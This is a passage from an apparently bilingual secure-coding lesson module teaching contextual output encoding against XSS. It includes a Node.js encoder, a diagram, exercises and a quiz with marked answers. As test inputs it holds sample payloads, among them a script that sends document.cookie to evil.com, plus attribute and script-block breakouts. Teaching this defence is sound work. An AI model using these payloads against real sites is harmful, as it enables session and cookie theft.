import type { Lesson } from '../../../lib/types';

export const OutputEncodingLesson: Lesson = {
  slug: 'output-encoding',
  tech: 'secure-coding',
  title: {
    en: 'Output Encoding: Contextual Escaping & XSS Neutralization',
    bn: 'আউটপুট এনকোডিং: কনটেক্সচুয়াল এস্কেপিং এবং XSS প্রতিরোধ'
  },
  summary: {
    en: 'Defend modern web applications against Cross-Site Scripting (XSS) using contextual output encoding. Understand why generic HTML escaping fails when data is rendered inside HTML attributes, JavaScript script blocks, CSS styles, or URL parameters. Master the 5 browser parsing contexts, safe DOM manipulation APIs, and how Content Security Policy headers provide secondary cryptographic protection.',
    bn: 'কনটেক্সচুয়াল আউটপুট এনকোডিং ব্যবহার করে ওয়েব অ্যাপ্লিকেশনকে ক্রস-সাইট স্ক্রিপ্টিং (XSS) থেকে সুরক্ষিত রাখুন। এইচটিএমএল অ্যাট্রিবিউট, জাভাস্ক্রিপ্ট ব্লক, সিএসএস স্টাইল বা ইউআরএল প্যারামিটারে ডেটা রেন্ডার করার সময় সাধারণ এস্কেপিং কেন ব্যর্থ হয় তা বুঝুন। ব্রাউজারের ৫ টি পার্সিং কনটেক্সট, নিরাপদ DOM ম্যানিপুলেশন এপিআই এবং কনটেন্ট সিকিউরিটি পলিসি (CSP) হেডার ব্যবহারের পদ্ধতি আয়ত্ত করুন।',
  },
  minutes: 20,
  blocks: [
    {
      type: 'heading',
      id: 'the-xss-hazard',
      text: {
        en: 'The Cross-Site Scripting (XSS) Hazard',
        bn: 'ক্রস-সাইট স্ক্রিপ্টিং (XSS) এর মারাত্মক ঝুঁকি'
      },
    },
    {
      type: 'para',
      text: {
        en: 'When your application displays user text back onto web pages, browsers face a fundamental dilemma. They must decide whether that incoming character stream is harmless display data or executable markup.',
        bn: 'যখন আপনার অ্যাপ্লিকেশন ব্যবহারকারীর পাঠানো টেক্সট ওয়েব পেজে পুনরায় প্রদর্শন করে, তখন ব্রাউজার একটি বড় দ্বিধায় পড়ে। ব্রাউজারকে বুঝতে হয় যে এই লেখাটি কেবল সাধারণ ডিসপ্লে টেক্সট, নাকি এটি কার্যকর করার মতো এইচটিএমএল কোড।'
      },
    },
    {
      type: 'para',
      text: {
        en: 'If an attacker submits a malicious script tag and your server reflects it back without encoding, the victim browser executes that script inside the victim authenticated session. The script can steal session cookies, capture keyboard inputs, or perform unauthorized financial transfers. Output Encoding neutralizes this hazard by converting dangerous syntax characters into inert display entities.',
        bn: 'যদি কোনো আক্রমণকারী ক্ষতিকর স্ক্রিপ্ট ট্যাগ পাঠায় এবং আপনার সার্ভার তা পরিবর্তন না করেই পেজে দেখায়, তবে ব্যবহারকারীর ব্রাউজার সেই স্ক্রিপ্টটি চালিয়ে দেয়। স্ক্রিপ্টটি ইউজারের সেশন কুকি চুরি করতে পারে, কিবোর্ডের পাসওয়ার্ড রেকর্ড করতে পারে বা ব্যাংক থেকে টাকা সরিয়ে নিতে পারে। আউটপুট এনকোডিং এই ঝুঁকি দূর করতে ক্ষতিকর ক্যারেক্টারগুলোকে নিরীহ টেক্সট এনটিটিতে রূপান্তর করে দেয়।'
      },
    },
    {
      type: 'steps',
      items: [
        {
          title: {
            en: '1. HTML Body Context (<div>...</div>)',
            bn: '১. এইচটিএমএল বডি কনটেক্সট (<div>...</div>)'
          },
          text: {
            en: 'Inside standard HTML elements, angle brackets and ampersands must be converted into HTML entities (such as &lt; for < and &gt; for >) so the browser parser never interprets them as tags.',
            bn: 'এইচটিএমএল ট্যাগের ভেতরে অ্যাঙ্গেল ব্র্যাকেট ও অ্যামপারস্যান্ডকে অবশ্যই এইচটিএমএল এনটিটিতে রূপান্তর করতে হবে ( যেমন < এর বদলে &lt; এবং > এর বদলে &gt; ) যাতে ব্রাউজার এগুলোকে নতুন ট্যাগ মনে না করে।'
          },
        },
        {
          title: {
            en: '2. HTML Attribute Context (<input value="...">)',
            bn: '২. এইচটিএমএল অ্যাট্রিবিউট কনটেক্সট (<input value="...">)'
          },
          text: {
            en: 'Inside element attributes, all values must be enclosed in quotes and have quotation marks escaped to prevent attackers from breaking out of the attribute string.',
            bn: 'ট্যাগের অ্যাট্রিবিউটের ভেতরে সমস্ত মানকে কোটেশনের মধ্যে রাখতে হয় এবং ভেতরের কোটেশন এস্কেপ করতে হয় যাতে আক্রমণকারী কোটেশন ভেঙে নতুন অ্যাট্রিবিউট তৈরি করতে না পারে।'
          },
        },
        {
          title: {
            en: '3. JavaScript Script Context (<script>let x = "...";</script>)',
            bn: '৩. জাভাস্ক্রিপ্ট স্ক্রিপ্ট কনটেক্সট'
          },
          text: {
            en: 'HTML entity escaping does not protect JavaScript strings! Data injected into script blocks must be JSON-serialized with forward slashes and angle brackets escaped to unicode escapes.',
            bn: 'এইচটিএমএল এনটিটি এস্কেপিং জাভাস্ক্রিপ্ট কোডকে রক্ষা করতে পারে না! স্ক্রিপ্ট ব্লকে পাঠানো ডাটাকে অবশ্যই JSON হিসেবে এবং অ্যাঙ্গেল ব্র্যাকেটকে ইউনিকোড এস্কেপে রূপান্তর করে পাঠাতে হয়।'
          },
        },
        {
          title: {
            en: '4. URL Context (<a href="...">)',
            bn: '৪. ইউআরএল কনটেক্সট (<a href="...">)'
          },
          text: {
            en: 'Links and redirect destinations must be validated against allowed protocols (http: and https:) to strictly block the dangerous javascript: execution pseudo-protocol.',
            bn: 'যেকোনো লিংকের গন্তব্যকে অনুমোদিত প্রটোকল ( http: এবং https: ) দিয়ে যাচাই করতে হবে যাতে ক্ষতিকর javascript: সিউডো-প্রটোকল পুরোপুরি ব্লক করা যায়।'
          },
        },
        {
          title: {
            en: '5. CSS Style Context (<div style="...">)',
            bn: '৫. সিএসএস স্টাইল কনটেক্সট (<div style="...">)'
          },
          text: {
            en: 'Style attributes must enforce strict alphanumeric allowlists to block style expressions and background image URLs that trigger remote payload fetches.',
            bn: 'স্টাইল অ্যাট্রিবিউটে অবশ্যই কঠোর আলফানিউমেরিক নিয়ম মানতে হবে যাতে ক্ষতিকর ব্যাকগ্রাউন্ড ইমেজ ইউআরএল বা এক্সপ্রেশনের মাধ্যমে আক্রমণ না ঘটতে পারে।'
          },
        },
      ],
    },
    {
      type: 'diagram',
      title: {
        en: 'The 5 Browser Parsing Contexts: Matching Encoding Rules to Render Targets',
        bn: '৫ টি ব্রাউজার পার্সিং কনটেক্সট: সঠিক স্থানে সঠিক এনকোডিং প্রয়োগ'
      },
      svg: `<svg viewBox="0 0 840 440" width="100%" height="auto" font-family="ui-monospace, monospace" role="img" aria-label="The five browser parsing contexts showing HTML body, attribute, JavaScript, URL, and CSS specific escaping rules">
  <rect width="840" height="440" fill="#0f172a" rx="12"/>
  
  <text x="420" y="26" fill="#38bdf8" font-size="14" font-weight="bold" text-anchor="middle">THE 5 BROWSER PARSING CONTEXTS &amp; ESCAPING RULES</text>
  
  <!-- Grid of 5 Contexts -->
  <!-- Box 1: HTML Body -->
  <g transform="translate(30, 48)">
    <rect width="375" height="105" rx="8" fill="#1e293b" stroke="#38bdf8" stroke-width="2"/>
    <text x="20" y="24" fill="#38bdf8" font-size="11" font-weight="bold">1. HTML BODY CONTEXT (&lt;div&gt;DATA&lt;/div&gt;)</text>
    <rect x="15" y="36" width="345" height="55" rx="4" fill="#0f172a"/>
    <text x="25" y="54" fill="#fca5a5" font-size="9">Input:  &lt;script&gt;alert(1)&lt;/script&gt;</text>
    <text x="25" y="72" fill="#6ee7b7" font-size="9">Escape: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</text>
    <text x="25" y="85" fill="#cbd5e1" font-size="8">Converts &amp;, &lt;, &gt;, ", ' into HTML entity equivalents</text>
  </g>
  
  <!-- Box 2: HTML Attribute -->
  <g transform="translate(435, 48)">
    <rect width="375" height="105" rx="8" fill="#1e293b" stroke="#f59e0b" stroke-width="2"/>
    <text x="20" y="24" fill="#f59e0b" font-size="11" font-weight="bold">2. ATTRIBUTE CONTEXT (&lt;input value="DATA"&gt;)</text>
    <rect x="15" y="36" width="345" height="55" rx="4" fill="#0f172a"/>
    <text x="25" y="54" fill="#fca5a5" font-size="9">Input:  " onfocus="alert(1)</text>
    <text x="25" y="72" fill="#6ee7b7" font-size="9">Escape: &amp;quot; onfocus=&amp;quot;alert(1)</text>
    <text x="25" y="85" fill="#cbd5e1" font-size="8">Always enclose in quotes; escape quotes and ampersands</text>
  </g>
  
  <!-- Box 3: JavaScript Context -->
  <g transform="translate(30, 168)">
    <rect width="375" height="105" rx="8" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
    <text x="20" y="24" fill="#10b981" font-size="11" font-weight="bold">3. JAVASCRIPT CONTEXT (&lt;script&gt;var x = DATA;&lt;/script&gt;)</text>
    <rect x="15" y="36" width="345" height="55" rx="4" fill="#0f172a"/>
    <text x="25" y="54" fill="#fca5a5" font-size="9">Input:  &lt;/script&gt;&lt;script&gt;steal()</text>
    <text x="25" y="72" fill="#6ee7b7" font-size="9">Escape: \\u003c/script\\u003e\\u003cscript\\u003e</text>
    <text x="25" y="85" fill="#cbd5e1" font-size="8">HTML entities fail here! Must use Unicode JSON escaping</text>
  </g>
  
  <!-- Box 4: URL Context -->
  <g transform="translate(435, 168)">
    <rect width="375" height="105" rx="8" fill="#1e293b" stroke="#818cf8" stroke-width="2"/>
    <text x="20" y="24" fill="#818cf8" font-size="11" font-weight="bold">4. URL CONTEXT (&lt;a href="DATA"&gt;)</text>
    <rect x="15" y="36" width="345" height="55" rx="4" fill="#0f172a"/>
    <text x="25" y="54" fill="#fca5a5" font-size="9">Input:  javascript:alert(document.cookie)</text>
    <text x="25" y="72" fill="#6ee7b7" font-size="9">Defense: Protocol Allowlist (http: / https: only!)</text>
    <text x="25" y="85" fill="#cbd5e1" font-size="8">Reject pseudo-protocols; percent-encode query params</text>
  </g>
  
  <!-- Bottom Banner: CSP Defense-in-Depth -->
  <g transform="translate(30, 288)">
    <rect width="780" height="110" rx="8" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
    <text x="390" y="26" fill="#10b981" font-size="11" font-weight="bold" text-anchor="middle">SECONDARY DEFENSE: CONTENT SECURITY POLICY (CSP) HTTP HEADERS</text>
    
    <rect x="20" y="40" width="740" height="55" rx="4" fill="#0f172a"/>
    <text x="30" y="60" fill="#38bdf8" font-size="10" font-weight="bold">Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';</text>
    <text x="30" y="78" fill="#cbd5e1" font-size="9">Even if an attacker injects a script tag via an encoding flaw, the browser refuses execution without the secret nonce!</text>
  </g>
  
  <text x="420" y="424" fill="#94a3b8" font-size="10" text-anchor="middle">Contextual encoding neutralizes XSS payloads before rendering; CSP headers provide a cryptographic safety net</text>
</svg>`,
      caption: {
        en: 'Different browser parsing contexts require specialized encoding rules: HTML entities, unicode JSON escapes, and protocol allowlists.',
        bn: 'ব্রাউজারের বিভিন্ন পার্সিং কনটেক্সটে ভিন্ন ভিন্ন এনকোডিং নিয়ম প্রয়োজন: এইচটিএমএল এনটিটি, ইউনিকোড JSON এস্কেপ এবং প্রটোকল অ্যালাউলিস্ট।'
      },
    },
    {
      type: 'heading',
      id: 'contextual-encoder-code',
      text: {
        en: 'Building a Contextual Output Sanitizer in Node.js',
        bn: 'Node.js-এ কনটেক্সচুয়াল আউটপুট স্যানিটাইজার তৈরি'
      },
    },
    {
      type: 'para',
      text: {
        en: 'To observe how contextual encoding neutralizes XSS payloads across different render targets, inspect the following encoder. It applies targeted escape rules for HTML body text, attributes, embedded JavaScript, and URL links.',
        bn: 'ভিন্ন ভিন্ন রেন্ডার টার্গেটে কনটেক্সচুয়াল এনকোডিং কীভাবে ক্ষতিকর XSS আক্রমণ প্রতিহত করে তা দেখতে নিচের এনকোডার কোডটি পর্যালোচনা করুন। এটি এইচটিএমএল টেক্সট, অ্যাট্রিবিউট, জাভাস্ক্রিপ্ট এবং ইউআরএল লিংকের জন্য সুনির্দিষ্ট নিয়ম প্রয়োগ করে।'
      },
    },
    {
      type: 'code',
      lang: 'javascript',
      filename: 'contextual-output-encoder.js',
      code: `// Multi-Context Output Sanitization Engine for Modern Web Applications
// Defends against Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)

class ContextualEncoder {
  // Context 1: HTML Body Context
  static encodeForHtml(inputString) {
    return String(inputString ?? '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  // Context 2: HTML Attribute Context
  static encodeForAttribute(inputString) {
    return String(inputString ?? '')
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\\x60/g, '&#x60;');
  }

  // Context 3: JavaScript Object Context within <script>
  static serializeForScript(dataObject) {
    // Escaping < and > prevents attackers from injecting </script> closing tags
    return JSON.stringify(dataObject)
      .replace(/</g, '\\\\u003c')
      .replace(/>/g, '\\\\u003e')
      .replace(/&/g, '\\\\u0026');
  }

  // Context 4: URL Attribute Context (href, src)
  static sanitizeUrl(rawUrl) {
    const trimmedUrl = String(rawUrl ?? '').trim();
    // Allowlist only safe http, https, mailto, and relative paths
    const isSafeProtocol = /^(https?:|mailto:|\\/|#)/i.test(trimmedUrl);
    if (!isSafeProtocol) {
      console.log('[SECURITY BLOCKED] Disallowed protocol detected in URL:', trimmedUrl);
      return '#blocked-unsafe-protocol';
    }
    return encodeURI(trimmedUrl);
  }
}

console.log('=== Step 1: Neutralizing Script Tags in HTML Body ===');
const bodyAttack = '<script>fetch("http://evil.com/steal?c=" + document.cookie)</script>';
console.log('Raw Attack:     ', bodyAttack);
console.log('Safe Encoded:   ', ContextualEncoder.encodeForHtml(bodyAttack));

console.log('\\n=== Step 2: Neutralizing Attribute Breakout Payloads ===');
const attributeAttack = '" onfocus="alert(document.domain)" autofocus="';
console.log('Safe Attribute: ', '<input value="' + ContextualEncoder.encodeForAttribute(attributeAttack) + '">');

console.log('\\n=== Step 3: Neutralizing Script Block Breakouts in JSON ===');
const scriptAttack = { userBio: '</script><script>alert("PWNED")</script>' };
console.log('Safe Script JSON:', ContextualEncoder.serializeForScript(scriptAttack));

console.log('\\n=== Step 4: Neutralizing Dangerous javascript: URLs ===');
const urlAttack = 'javascript:alert(document.cookie)';
console.log('Resulting Link: ', '<a href="' + ContextualEncoder.sanitizeUrl(urlAttack) + '">Profile</a>');`,
      caption: {
        en: 'The contextual encoder neutralizes body script tags, attribute breakouts, JSON tag breakouts, and javascript: links.',
        bn: 'কনটেক্সচুয়াল এনকোডারটি বডি স্ক্রিপ্ট, অ্যাট্রিবিউট ব্রেকআউট, JSON ট্যাগ ব্রেকআউট এবং ক্ষতিকর javascript: লিংক সফলভাবে প্রতিহত করে।'
      },
    },
    {
      type: 'callout',
      kind: 'info',
      title: {
        en: 'Safe DOM APIs: innerHTML versus textContent',
        bn: 'নিরাপদ DOM এপিআই: innerHTML বনাম textContent'
      },
      text: {
        en: 'In frontend JavaScript, how data is inserted into the Document Object Model dictates XSS risk. Assigning user text to element.innerHTML instructs the browser HTML parser to execute any embedded script or image error handlers! In contrast, using element.textContent treats the input purely as plain text, bypassing the HTML parser completely. When rich HTML markup is genuinely required, sanitize it using proven libraries like DOMPurify rather than custom regexes.',
        bn: 'ফ্রন্টএন্ড জাভাস্ক্রিপ্টে ব্রাউজারের DOM-এ কীভাবে ডাটা যুক্ত করা হচ্ছে তা XSS আক্রমণের ঝুঁকি নির্ধারণ করে। কোনো টেক্সটকে element.innerHTML এ দিলে ব্রাউজার এর ভেতরের স্ক্রিপ্ট বা ক্ষতিকর কোড চালিয়ে দেয়! বিপরীতে, element.textContent ব্যবহার করলে ব্রাউজার ডাটাকে কেবল সাধারণ লেখা হিসেবে দেখে এবং কোনো কোড চালায় না। ওয়েবসাইটে সমৃদ্ধ এইচটিএমএল দেখানোর প্রয়োজন হলে নিজস্ব কোড না লিখে DOMPurify-এর মতো বিশ্বস্ত লাইব্রেরি ব্যবহার করুন।'
      },
    },
  ],
  exercises: [
    {
      id: 'out-enc-ex-1',
      kind: 'predict',
      topic: 'browser-contexts',
      question: {
        en: 'How many primary browser parsing contexts (HTML Body, Attribute, JavaScript, URL, CSS) govern output encoding? (5). Type the number.',
        bn: 'আউটপুট এনকোডিং পরিচালনাকারী প্রধান ব্রাউজার পার্সিং কনটেক্সট ( HTML Body, Attribute, JavaScript, URL, CSS ) সর্বমোট কয়টি? ( ৫ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '5',
      hint: {
        en: 'Count the 5 browser contexts.',
        bn: '৫ টি ব্রাউজার কনটেক্সট গণনা করুন।'
      },
      explanation: {
        en: 'Web browsers parse data using 5 distinct parsers, each requiring its own contextual escaping rules.',
        bn: 'ওয়েব ব্রাউজার ৫ টি ভিন্ন পার্সারের মাধ্যমে ডাটা পড়ে, যার প্রতিটির জন্য আলাদা এনকোডিং নিয়ম প্রয়োজন।'
      },
    },
    {
      id: 'out-enc-ex-2',
      kind: 'mcq',
      topic: 'script-context-entities',
      question: {
        en: 'Why does standard HTML entity escaping fail to protect data rendered inside an inline JavaScript script tag?',
        bn: 'ইনলাইন জাভাস্ক্রিপ্ট স্ক্রিপ্ট ট্যাগের ভেতর ডাটা দেখানোর সময় সাধারণ এইচটিএমএল এনটিটি এস্কেপিং কেন ব্যর্থ হয়?'
      },
      options: [
        {
          en: 'Because JavaScript strings are evaluated by the V8/SpiderMonkey JavaScript engine rather than the HTML parser, so entity references like &quot; do not prevent JavaScript string syntax breakouts',
          bn: 'কারণ জাভাস্ক্রিপ্ট কোড এইচটিএমএল পার্সারের বদলে জাভাস্ক্রিপ্ট ইঞ্জিন দ্বারা পরিচালিত হয়, ফলে &quot; এর মতো এনটিটি জাভাস্ক্রিপ্ট স্ট্রিং ভেঙে কোড চালানো আটকাতে পারে না',
        },
        {
          en: 'Because JavaScript code cannot run on internet websites that use colors',
          bn: 'কারণ রঙিন ওয়েবসাইটগুলোতে জাভাস্ক্রিপ্ট কোড চলতে পারে না',
        },
        {
          en: 'Because HTML entities turn off the computer cooling fans automatically',
          bn: 'কারণ এইচটিএমএল এনটিটি কম্পিউটারের কুলিং ফ্যান বন্ধ করে দেয়',
        },
        {
          en: 'Because script tags only accept physical handwritten text',
          bn: 'কারণ স্ক্রিপ্ট ট্যাগ কেবল হাতে লেখা টেক্সট গ্রহণ করতে পারে',
        },
      ],
      answer: 0,
      hint: {
        en: 'JavaScript engines do not decode HTML entities inside string literals.',
        bn: 'জাভাস্ক্রিপ্ট ইঞ্জিন স্ট্রিংয়ের ভেতরে এইচটিএমএল এনটিটি ডিকোড করে না।',
      },
      explanation: {
        en: 'Inside <script>, the JavaScript parser governs execution. Data must be JSON-serialized with unicode escaping rather than HTML entities.',
        bn: 'স্ক্রিপ্ট ট্যাগের ভেতরে জাভাস্ক্রিপ্ট পার্সার কাজ করে, তাই সেখানে এইচটিএমএল এনটিটির বদলে ইউনিকোড এস্কেপ ব্যবহার করতে হয়।'
      },
    },
    {
      id: 'out-enc-ex-3',
      kind: 'mcq',
      topic: 'javascript-pseudo-protocol',
      question: {
        en: 'What dangerous URL pseudo-protocol allows attackers to execute arbitrary JavaScript when an unsanitized link href is clicked?',
        bn: 'লিংকের href-এ কোনো যাচাই না থাকলে কোন বিপজ্জনক ইউআরএল সিউডো-প্রটোকল আক্রমণকারীকে জাভাস্ক্রিপ্ট কোড চালানোর সুযোগ দেয়?'
      },
      options: [
        {
          en: 'The javascript: pseudo-protocol (such as javascript:alert(document.cookie)) which executes script directly in the browser address context',
          bn: 'javascript: সিউডো-প্রটোকল ( যেমন javascript:alert(document.cookie) ) যা ব্রাউজারের ভেতর সরাসরি ক্ষতিকর স্ক্রিপ্ট কার্যকর করে',
        },
        {
          en: 'The standard secure https: website protocol',
          bn: 'সাধারণ নিরাপদ https: ওয়েবসাইট প্রটোকল',
        },
        {
          en: 'The standard local file file: directory protocol',
          bn: 'সাধারণ লোকাল ফাইল file: ডিরেক্টরি প্রটোকল',
        },
        {
          en: 'The standard electronic mail mailto: message protocol',
          bn: 'সাধারণ ইলেকট্রনিক মেইল mailto: বার্তা প্রটোকল',
        },
      ],
      answer: 0,
      hint: {
        en: 'The javascript: protocol executes inline script on link click.',
        bn: 'javascript: প্রটোকলটি লিংকে ক্লিকের সাথে সাথে স্ক্রিপ্ট চালায়।',
      },
      explanation: {
        en: 'If href accepts javascript: URLs, clicking the link executes arbitrary attacker code. Sanitize URLs with protocol allowlists.',
        bn: 'লিংকে javascript: থাকলে ক্লিকে কোড চালু হয়। প্রটোকল অ্যালাউলিস্ট দিয়ে কেবল নিরাপদ লিংক গ্রহণ করতে হয়।'
      },
    },
    {
      id: 'out-enc-ex-4',
      kind: 'predict',
      topic: 'html-entity-escaping',
      question: {
        en: 'How many characters are converted in standard 5-character HTML escaping (&, <, >, ", \')? (5). Type the number.',
        bn: 'স্ট্যান্ডার্ড ৫-ক্যারেক্টার এইচটিএমএল এস্কেপিংয়ে (&, <, >, ", \') সর্বমোট কয়টি বিশেষ ক্যারেক্টারকে এনটিটিতে রূপান্তর করা হয়? ( ৫ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '5',
      hint: {
        en: 'The standard set contains 5 characters.',
        bn: 'স্ট্যান্ডার্ড সেটে ৫ টি ক্যারেক্টার থাকে।'
      },
      explanation: {
        en: 'Standard HTML escaping targets the 5 critical syntax characters: ampersand, left angle, right angle, double quote, and single quote.',
        bn: 'এইচটিএমএল এস্কেপিং ৫ টি মূল ক্যারেক্টারকে লক্ষ্য করে: অ্যামপারস্যান্ড, বাম ব্র্যাকেট, ডান ব্র্যাকেট, ডাবল কোট এবং সিঙ্গেল কোট।'
      },
    },
  ],
  quiz: {
    id: 'output-encoding-quiz',
    title: {
      en: 'Output Encoding and XSS Defense Quiz',
      bn: 'আউটপুট এনকোডিং ও XSS প্রতিরোধ কুইজ'
    },
    questions: [
      {
        id: 'out-enc-qz-1',
        kind: 'mcq',
        topic: 'textcontent-vs-innerhtml',
        question: {
          en: 'Why is element.textContent inherently immune to DOM-based XSS attacks compared to element.innerHTML?',
          bn: 'element.innerHTML-এর তুলনায় element.textContent সহজাতভাবেই DOM-ভিত্তিক XSS আক্রমণ থেকে সম্পূর্ণ সুরক্ষিত কেন?'
        },
        options: [
          {
            en: 'textContent assigns data directly to text nodes, entirely bypassing the browser HTML parser and treating all characters strictly as literal display text',
            bn: 'textContent সরাসরি টেক্সট নোডে ডাটা বসায় এবং ব্রাউজারের এইচটিএমএল পার্সারকে সম্পূর্ণ এড়িয়ে সমস্ত ক্যারেক্টারকে নিরীহ সাধারণ লেখা হিসেবে গণ্য করে',
          },
          {
            en: 'Because textContent makes computer monitors physically brighter',
            bn: 'কারণ textContent কম্পিউটার মনিটরের উজ্জ্বলতা শারীরিকভাবে বাড়িয়ে দেয়',
          },
          {
            en: 'Because textContent only works when computers are turned off',
            bn: 'কারণ textContent কেবল কম্পিউটার বন্ধ থাকা অবস্থায় কাজ করে',
          },
          {
            en: 'Because textContent encrypts user text using military satellites',
            bn: 'কারণ textContent মিলিটারি স্যাটেলাইট ব্যবহার করে টেক্সট এনক্রিপ্ট করে',
          },
        ],
        answer: 0,
        hint: {
          en: 'textContent bypasses HTML parsing, rendering input strictly as literal text.',
          bn: 'textContent এইচটিএমএল পার্সারকে এড়িয়ে সমস্ত ডাটাকে সাধারণ লেখা হিসেবে দেখায়।',
        },
        explanation: {
          en: 'innerHTML invokes the HTML parser which executes scripts and event handlers. textContent creates a text node where markup cannot execute.',
          bn: 'innerHTML পার্সার ডেকে স্ক্রিপ্ট চালিয়ে দেয়। textContent কেবল টেক্সট নোড তৈরি করে যেখানে কোনো কোড চলতে পারে না।'
        },
      },
      {
        id: 'out-enc-qz-2',
        kind: 'mcq',
        topic: 'unquoted-attribute-xss',
        question: {
          en: 'How can an attacker successfully execute XSS through an unquoted HTML attribute even if quotation marks are escaped?',
          bn: 'কোটেশন চিহ্ন এস্কেপ করা সত্ত্বেও একটি কোটেশনহীন এইচটিএমএল অ্যাট্রিবিউটের মাধ্যমে আক্রমণকারী কীভাবে XSS ঘটাতে পারে?'
        },
        options: [
          {
            en: 'In unquoted attributes (<input value=USER_INPUT>), spaces, tabs, or forward slashes terminate the attribute, allowing the attacker to inject new event handlers like onfocus=alert(1)',
            bn: 'কোটেশনহীন অ্যাট্রিবিউটে স্পেস বা স্ল্যাশ দিলেই অ্যাট্রিবিউট শেষ হয়ে যায়, ফলে আক্রমণকারী সহজেই onfocus=alert(1) এর মতো নতুন ইভেন্ট হ্যান্ডলার বসিয়ে দিতে পারে',
          },
          {
            en: 'By disconnecting the physical computer keyboard from the USB port',
            bn: 'ইউএসবি পোর্ট থেকে কিবোর্ডের সংযোগ শারীরিকভাবে বিচ্ছিন্ন করার মাধ্যমে',
          },
          {
            en: 'By changing the computer operating system language to German',
            bn: 'কম্পিউটার অপারেটিং সিস্টেমের ভাষাকে জার্মান ভাষায় পরিবর্তন করার মাধ্যমে',
          },
          {
            en: 'By lowering the computer speaker volume to zero permanently',
            bn: 'কম্পিউটার স্পিকারের সাউন্ড চিরতরে শূন্যে নামিয়ে আনার মাধ্যমে',
          },
        ],
        answer: 0,
        hint: {
          en: 'Unquoted attributes can be terminated with whitespace, injecting new event handlers.',
          bn: 'কোটেশন ছাড়া অ্যাট্রিবিউটে স্পেস দিয়েই নতুন ক্ষতিকর ইভেন্ট যুক্ত করা যায়।',
        },
        explanation: {
          en: 'HTML syntax allows spaces to delimit attributes. Without quotes, an attacker uses space to break out and inject onload, onerror, or onfocus.',
          bn: 'কোটেশন না থাকলে স্পেস দিয়েই অ্যাট্রিবিউট ভেঙে onerror বা onfocus এর মতো কোড চালানো সম্ভব।'
        },
      },
      {
        id: 'out-enc-qz-3',
        kind: 'mcq',
        topic: 'csp-defense-in-depth',
        question: {
          en: 'How does a Content Security Policy (CSP) HTTP response header provide Defense-in-Depth against Cross-Site Scripting?',
          bn: 'একটি কনটেন্ট সিকিউরিটি পলিসি (CSP) এইচটিটিপি রেসপন্স হেডার কীভাবে XSS-এর বিরুদ্ধে বহুস্তরী প্রতিরক্ষা দেয়?'
        },
        options: [
          {
            en: 'It instructs the browser to restrict which origins can execute scripts and disables inline script execution unless signed with a cryptographic nonce or hash',
            bn: 'এটি ব্রাউজারকে নির্দেশ দেয় কোন কোন বিশ্বস্ত উৎস থেকে স্ক্রিপ্ট চলতে পারবে এবং গোপন ননস (nonce) বা হ্যাশ ছাড়া যেকোনো ইনলাইন স্ক্রিপ্ট চালানো নিষিদ্ধ করে দেয়',
          },
          {
            en: 'It deletes all user passwords stored inside web browser cookies',
            bn: 'এটি ওয়েব ব্রাউজারের কুকিতে থাকা সমস্ত পাসওয়ার্ড নিজে থেকেই মুছে ফেলে',
          },
          {
            en: 'It doubles the physical processing speed of the local Wi-Fi router',
            bn: 'এটি লোকাল ওয়াই-ফাই রাউটারের প্রক্রিয়াকরণের গতি দ্বিগুণ করে দেয়',
          },
          {
            en: 'It turns all incoming web pages into black and white images',
            bn: 'এটি সমস্ত ইনকামিং ওয়েব পেজকে সাদাকালো ছবিতে রূপান্তরিত করে',
          },
        ],
        answer: 0,
        hint: {
          en: 'CSP blocks unauthorized script sources and disables inline script execution without nonces.',
          bn: 'CSP অননুমোদিত উৎসের স্ক্রিপ্ট ব্লক করে এবং ননস ছাড়া ইনলাইন কোড চলতে দেয় না।',
        },
        explanation: {
          en: 'Even if an attacker injects a script tag via an output encoding flaw, the browser CSP blocks execution if the script lacks a valid cryptographic nonce.',
          bn: 'এনকোডিংয়ে ভুল থাকলেও CSP থাকলে ব্রাউজার গোপন ননস বা হ্যাশ ছাড়া ক্ষতিকর স্ক্রিপ্ট চালানো পুরোপুরি আটকে দেয়।'
        },
      },
      {
        id: 'out-enc-qz-4',
        kind: 'mcq',
        topic: 'json-script-tag-breakout',
        question: {
          en: 'Why must JSON objects rendered inside inline script tags have angle brackets (< and >) escaped to unicode sequences (\\\\u003c and \\\\u003e)?',
          bn: 'ইনলাইন স্ক্রিপ্ট ট্যাগের ভেতর রেন্ডার করা JSON অবজেক্টে অ্যাঙ্গেল ব্র্যাকেট (< এবং >) কেন ইউনিকোড সিকোয়েন্সে এস্কেপ করা আবশ্যক?'
        },
        options: [
          {
            en: 'The HTML parser takes precedence over the JavaScript parser; an unescaped </script> inside a JSON string immediately terminates the script block and exposes subsequent text to HTML execution',
            bn: 'এইচটিএমএল পার্সার জাভাস্ক্রিপ্ট পার্সারের চেয়ে আগে কাজ করে; JSON স্ট্রিংয়ের ভেতরের </script> দেখা মাত্রই এটি স্ক্রিপ্ট ব্লক বন্ধ করে দেয় এবং পরের লেখাকে ক্ষতিকর কোড হিসেবে চালায়',
          },
          {
            en: 'Because JSON syntax strictly forbids angle brackets in all circumstances',
            bn: 'কারণ JSON নিয়মকানুন যেকোনো পরিস্থিতিতে অ্যাঙ্গেল ব্র্যাকেট ব্যবহার নিষিদ্ধ করে',
          },
          {
            en: 'Because angle brackets consume ten times more bandwidth over internet cables',
            bn: 'কারণ অ্যাঙ্গেল ব্র্যাকেট ইন্টারনেট কেবলে দশ গুণ বেশি ব্যান্ডউইথ খরচ করে',
          },
          {
            en: 'Because unicode escaping makes web browsers display letters in 3D',
            bn: 'কারণ ইউনিকোড এস্কেপিং ব্রাউজারে সমস্ত অক্ষরকে থ্রি-ডি আকারে দেখায়',
          },
        ],
        answer: 0,
        hint: {
          en: '</script> closes the script block prematurely, breaking out into HTML context.',
          bn: '</script> স্ক্রিপ্ট ট্যাগকে অসময়ে বন্ধ করে দিয়ে এইচটিএমএল কনটেক্সটে আক্রমণ ঘটায়।',
        },
        explanation: {
